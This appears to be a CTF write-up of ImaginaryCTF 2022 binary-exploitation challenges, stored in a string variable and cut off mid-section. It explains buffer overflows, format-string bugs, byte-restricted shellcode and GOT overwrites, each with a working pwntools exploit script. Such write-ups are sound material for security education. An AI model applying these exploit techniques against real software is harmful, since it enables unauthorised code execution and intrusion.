full_description = '''Imaginary CTF 2022 Writeups23 Jul 2022Table of Contentsret2win (100 pts) - 266 solvesAnalysisExploit Scriptbof (100 pts) - 190 solvesAnalysisExploit Scriptbellcode (390 pts) - 37 solvesAnalysisExploit Scriptgolf (428 pts) - 30 solvesAnalysisFinal Exploit ScriptFormat String Fun (474 pts) - 18 solvesAnalysisExploit ScriptAlternative SolutionUnderstanding Dynamic ResolutionExploit MethodologyIt all comes together…Exploit Scriptrope (474 pts) - 18 solvesAnalysisExploit Scriptpywrite (482 pts) - 15 solvesExploit ScriptCurrently serving conscription. These are writeups of challenges that I solved on a tablet from my army camp 👍👍ret2win (100 pts) - 266 solvesJumping around in memory is hard. I’ll give you some help so that you can pwn this! Author: Eth007vuln vuln.cAnalysis#include <stdio.h> #include <stdlib.h> int win() { FILE *fp; char flag[255]; fp = fopen("flag.txt", "r"); fgets(flag, 255, fp); puts(flag); } char **return_address; int main() { char buf[16]; return_address = buf+24; setvbuf(stdout,NULL,2,0); setvbuf(stdin,NULL,2,0); puts("Welcome to ret2win!"); puts("Right now I'm going to read in input."); puts("Can you overwrite the return address?"); gets(buf); printf("Returning to %p...\n", *return_address); } Looking at the source code, we can see that the program takes in an input with gets(buf).If we look at the gets() man page,we see that the gets() function is vulnerable to buffer overflow as it does not limit the user input.┌────────────────────────────────────────────────┐ │ │ │ │ │ │ │ │ │ │ │ │ │ buf[16] │ │ │ │ │ │ │ │ │ │ │ ├────────────────────────────────────────────────┤ │ │ │ │ input goes │ │ │ downwards │ saved rbp [8] │ │ │ │ │ │ │ │ ├────────────────────────────────────────────────┤ │ │ │ │ │ │ │ │ return address [8] │ │ │ │ │ │ │ │ └────────────────────────────────────────────────┘ ▼ Hence through overflowing our input buffer which only stores 16 bytes, we can write into the saved rbp and eventually the return address which the program will return to when the main function returns.If we overflow the return address with win, this will essentially call win and give us a shell!!Exploit Scriptfrom pwn import * # import the pwntools module to interact with program p = process('./vuln') # run the program # you can get this through running the # # $ nm vuln # ... # 00000000004011d6 T win # # or get it via gdb # # $ gdb vuln # (gdb) x win # 0x4011d6 <win>: 0xfa1e0ff3 # WIN = 0x4011d6 payload = b"A"*16 # fill up buf[16] payload += b"A"*8 # fill up saved rbp [8] payload += p64(WIN) # write win to return address, remember to pack address in 64 bit little endian p.sendline(payload) # send payload to program p.interactive() # get flag!! bof (100 pts) - 190 solvesCan you bof me? Author: Eth007bof bof.cAnalysis#include <stdio.h> #include <stdlib.h> struct string { char buf[64]; int check; }; char temp[1337]; int main() { struct string str; setvbuf(stdout,NULL,2,0); setvbuf(stdin,NULL,2,0); str.check = 0xdeadbeef; puts("Enter your string into my buffer:"); fgets(temp, 5, stdin); // input of 5 bytes sprintf(str.buf, temp); // output of format string is written to str.buf // we need to write >64 chars into str.buf to overflow check if (str.check != 0xdeadbeef) { system("cat flag.txt"); } } The program takes in 5 bytes of input from the user into a variable temp.The contents of temp are then read into str.buf through sprintf.Finally, the program gives a flag if the value of str.check was modified.Technically, if we can only input 5 bytes into buf, we will not be able to overflow check.However, you may have noticed but sprintf is vulnerable to a format string attack.Here’s the secure way to have used sprintf:sprintf(str.buf, "%s", temp); However, due to the lack of a format string in the code, we can maliciously input format strings of our own which would be interpreted in the same way by the computer.Hence, if we input %99c into the program, the program would copy 99 one byte characters from temp to str.buf, and hence overflowing str.check and giving us the flag.Exploit Scriptfrom pwn import * # import pwntools p = process('./bof') # run the program p.sendline("%90c") # overflow str.check p.interactive() # get flag! bellcode (390 pts) - 37 solvesDo you like Taco Bell? Author: Eth007bellcodeAnalysisint main() { // init functions -- can ignore setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); // map 0x2000 sized memory at 0xFAC300 with rwx permissions mmap((void *)0xFAC300, 0x2000uLL, 7, 33, -1, 0LL); puts("What's your shellcode?"); // get user input into mapped memory fgets((char *)0xFAC300, 4096, stdin); // for each character in user input, ensure that it is divisible by 5 for ( int i = 0xFAC300; i <= 0xFAD2FF; ++i ) { if ( *(_BYTE *)i % 5u ) { puts("Seems that you tried to escape. Try harder™."); exit(-1); } } puts("OK. Running your shellcode now!"); // run shellcode!! MEMORY[0xFAC300](); return 0; } As we can see from the commented code, this is a shellcoding challenge that requires us to give shellcode bytes that are divisible by 5.When we think of shellcode, we think of making syscalls to get our shell.Ideally, our final shellcode should look like this:rax = 59 # execve syscall *rdi = "/bin/sh\x00" rsi = 0 rdx = 0 syscall Let’s look at the state of the stack and registers right before the shellcode runs:As we can see, we have our registers set to# semi-ideal conditions for a read syscall rax = 0x0 rdi = 0x7ffff7fa89b0 # fd <- should be 0 (stdin) rsi = 0x1 # buf <- should be somewhere in our mmapped memory rdx = 0xfac300 With rax=0 and rdx=0xfac300, this is semi-ideal for a read syscall!!With a read syscall, we can ideally take in a second input without any restrictions and run it :)Let’s look at what other instructions we can use in our shellcode to help us set up our registers.# coding: utf-8 from pwn import * context.arch = 'amd64' for i in range(0, 0xff, 5): print(disasm(i.to_bytes(1, 'little'))) """ Truncated output: ... 0: 50 push rax 0: 55 push rbp 0: 5a pop rdx 0: 5f pop rdi ... """ Since rax = 0x0, we can set rdi = 0x0 by doing apush rax pop rdi Finally, after playing around in defuse.ca we can set rsi with a simplemov esi, 0xfac300 # or any other address at multiples of 5 Finally and most importantly, we are able to call syscall since it has an opcode that is also a multiple of 5.Let’s start crafting stage 1 of our exploit!from pwn import * context.arch = 'amd64' p = process('./bellcode') shellcode = asm(""" push rax pop rdi mov esi, 0xfac300 syscall """) p.sendline(shellcode) p.sendline(b"A"*100) # try to send something p.interactive() If we run this in gdb,Success! We see our shellcode being run here.After our shellcode finishes running, we SIGSEGV at 0xfac309.However, thanks to our stage 2 read, we are able to write a normal shellcode to pop a shell at that point. For this second shellcode, for convenience sake, we will just use pwnlib.shellcraft.Exploit Scriptfrom pwn import * context.arch = 'amd64' # tell pwntools to assemble our shellcode in x64 p = process('./bellcode') # stage 1 shellcode to read 0xfac300 bytes into 0xfac300 shellcode = asm(""" push rax pop rdi mov esi, 0xfac300 syscall """) p.sendline(shellcode) # stage 2 shellcode to place our shellcode to pop a shell on the stack p.sendline(b"A"*len(shellcode) + asm(shellcraft.sh())) p.interactive() golf (428 pts) - 30 solvesSome challenges provide source code to make life easier for beginners. Others provide it because reversing the program would be too time consuming for the CTF. Still others, like this one, do it just for the memes. Author: Eth007golf golf.cAnalysis[*] '/home/elmo/CTF/Archives/0722-ictf2022/pwn/golf/golf' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3ff000) #include <stdio.h> #include <stdlib.h> #include <string.h> __attribute__((constructor)) _(){setvbuf /* well the eyes didn't work out */ (stdout,0,2 ,0);setvbuf (stdin,0,2, 0);setvbuf( stderr,0,2, 0) ;} main( ){ char /* sus */ aa[ 256 ];; ;;; fgets(aa,256, stdin ) ; if( strlen (aa) < 11)printf(aa) ; else ; exit (00 );} /* i tried :sob: */ If we reformat the code#include <stdio.h> #include <stdlib.h> #include <string.h> __attribute__((constructor)) _(){ setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); setvbuf(stderr,0,2,0); } main() { char aa[256]; _(); fgets(aa,256,stdin ); // get 256 bytes of input if(strlen(aa) < 11) { // trigger fmt str vuln if strlen(aa) < 11 printf(aa); } else { exit(0); // else exit after getting input } } We can see that we have a program vulnerable to format string once again.If we look at the strlen() man page, we see thatThe strlen() function calculates the length of the string pointed to by s, excluding the terminating null byte (’\0’).This means that we can input 10 characters, input a null byte (to pass the strlen check), and then input other characters and still get our first 10 characters printed.However, this means that our format string has to be 10 characters or shorter which is a big restriction as we only can use around 2-3 format strings.At first glance, we could craft a payload like this to arbitrarily write into any address 10 bytes ◄────────────────────────────────────────► ┌────────────────────┬───────────────────┬──────┬─────────────────────┐ │ │ │ │ │ │ │ │ │ │ │ %Xc │ %Y$n │ \x00 │ address Z │ │ │ │ │ │ └────────────────────┴──────────┬────────┴──────┴─────────────────────┘ │ ▲ │ │ └────────────────────────┘ write X bytes into Z where Z is pointed to by offset Y on the stack However, consider the following conditionsif len(str(Y)) == 1: # if offset Y is one digit X = 10 - 4 = 6 # X can only be 6-2 digit # len(%XXXXc%Y$n) == 10 # which means X < 10000 and if len(str(Y)) == 2: X = 10 - 5 = 5 - 2 = 3 # X can only be 3 digits X < 1000 # keep in mind that X will overwrite all 8 bytes pointed at that address # and 10000 (0x2710) is insufficient to overflow to any useful number which means we can only write very small numbers and we wouldnt be able to do anything.This means that we have to come up with any idea.If we do some research and look at this link, we see that printf takes in a width (*) flag which prints the number of characters that it is pointed to.With that in mind, we can reformat our exploit to the following: 10 bytes ►────────────────────────────────────────► ┌────────────────────┼───────────────────┬──────┬─────────────────────┬──────────────────────┐ │ │ │ │ │ │ │ │ │ │ │ │ │ %*(Y+1)$c │ %Y$n │ \x00 │ address Z │ value X │ │ │ │ │ │ │ └─────────┬──────────┴──────────┬────────┴──────┴─────────────────────┴──────────────────────┘ │ │ ▲ ▲ │ │ │ │ │ └────────────────────────┘ │ │ write X bytes into Z │ │ where Z is pointed to by │ │ offset Y on the stack │ │ │ │ │ │ │ └───────────────────────────────────────────────────────────────────────┘ print $X amount of characters With this, we can right any amount of bytes we want into any given address!The only constraints we have left is that we are restricted to only one write, which is highly limited given that there is no win or shell function in the binary.We can overcome that by overwriting exit@plt.got with main so that the program loops endlessly and gives us unlimited writes. from pwn import * context.binary = elf = ELF('./golf') p = process('./golf') payload = b'%*8$c' + b'%9$n' assert len(payload) <= 10 # ensure format string does not exceed 10 characters payload += b'\x00' * (16-len(payload)) # pad payload so format specifiers are pointed correctly payload += p64(0x40121f) # main address payload += p64(elf.got.exit) # exit p.sendline(payload) p.interactive() With this we are able to get unlimited amount of writes.Next, we want to think about how to get a shell. If we look at the source code, we could ideally overwrite strlen@plt.got with system then send /bin/sh to get a shell.However we first need to leak our libc address. With trial and error, we can find the offset of the address of __libc_start_main+243 and use it to find the remote libc and calculate our libc base.Using libc-database we can find the version of the remote libc.We then patch our binary with the libc and calculate our libc base.from pwn import * import re libc = ELF('./libc.so.6') context.binary = elf = ELF('./golf') p = process('./golf') payload = b'%*8$c' + b'%9$n' assert len(payload) <= 10 # ensure format string does not exceed 10 characters payload += b'\x00' * (16-len(payload)) # pad payload so format specifiers are pointed correctly payload += p64(0x40121f) # main address payload += p64(elf.got.exit) # exit p.sendline(payload) p.sendline("%77$p") leak = int(re.findall(b'(0x\w+)', p.recvline())[0], 16) libc.address = leak - 243 - libc.sym.__libc_start_main info(f"libc base @ {libc.address:#x}") p.interactive() Finally, we have to overwrite strlen address with system address.However, we cannot use the same method we used to overwrite the exit.got address because libc address are generally much higher up i.e. 0x7ffff00000 range and it would take too much time to write that amount of byte into the strlen.got address.This means that we need to do a partial overwrite with the $hn positional write which only modifies 2 bytes.However if you look at the address in strlen@got.plt and the address in system, we notice that they differ by 3 bytes which is unfeasible for us to write to.However if we look inside system,We notice that it calls do_system() internally which ends with 0xd0, just like strlen.The two of them only differ by 2 bytes and it is totally possible for us to overwrite strlen@got.plt with do_system() which is pretty much just the internal call for system.With that we can craft our full exploit script.Final Exploit Script from pwn import * import re libc = ELF('./libc.so.6') context.binary = elf = ELF('./golf') p = process('./golf') payload = b'%*8$c' + b'%9$n' assert len(payload) <= 10 # ensure format string does not exceed 10 characters payload += b'\x00' * (16-len(payload)) # pad payload so format specifiers are pointed correctly payload += p64(0x40121f) # main address payload += p64(elf.got.exit) # exit p.sendline(payload) p.sendline("%77$p") leak = int(re.findall(b'(0x\w+)', p.recvline())[0], 16) libc.address = leak - 243 - libc.sym.__libc_start_main info(f"libc base @ {libc.address:#x}") payload = b'%*8$c' + b'%9$hn' assert len(payload) <= 10 payload += b'\x00' * (16-len(payload)) payload += p64(((libc.sym.system-1472) & 0xFFFF0) >> 8) payload += p64(elf.got.strlen+1) p.sendline(payload) p.sendline(b'/bin/sh') p.interactive() However for some reason, out of the 4 bits that we attempt to modify, only the last 3 bits are changed to our liking.Nevertheless, this just means that we have to brute force 1 bit, which would give us a favourable likelihood of 1/16 to pop a shell!Format String Fun (474 pts) - 18 solvesOne format string to rule them all, one format string to find them. One format string to bring them all, and in the darkness bind them. Author: Eth007fmt_fun libc.so.6Analysisint main() { // ignore setvbuf setvbuf(s'''
